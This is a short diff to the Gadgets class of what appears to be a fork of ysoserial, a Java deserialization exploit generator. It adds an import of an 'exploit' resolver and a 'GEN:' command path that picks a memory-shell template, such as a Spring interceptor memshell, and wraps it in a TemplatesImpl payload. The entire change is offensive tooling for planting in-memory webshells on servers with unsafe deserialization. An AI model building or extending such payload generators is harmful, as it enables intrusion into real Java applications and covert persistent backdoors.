@@ -15,6 +15,7 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.zip.GZIPOutputStream;
 
+import com.bloom.exploit.GenMemshellResolver;
 import ysoserial.payloads.templates.SpringInterceptorMemShell;
 import javassist.*;
 
@@ -95,6 +96,14 @@ public class Gadgets {
 
         if (command.startsWith("CLASS:")) {
             Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
+            return createTemplatesImpl(clazz, (String)null, (byte[])null, tplClass, abstTranslet, transFactory);
+        } else if (command.startsWith("GEN:")) {
+            String combo = command.substring(4);
+            String templateName = GenMemshellResolver.resolve(combo);
+            if (templateName == null) {
+                throw new IllegalArgumentException("[!] 无该 GEN 组合: " + combo);
+            }
+            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + templateName, false, Gadgets.class.getClassLoader());
             return createTemplatesImpl(clazz, (String)null, (byte[])null, tplClass, abstTranslet, transFactory);
         } else if (command.startsWith("FILE:")) {
             byte[] bs = Files.readBytes(new File(command.substring(5)));
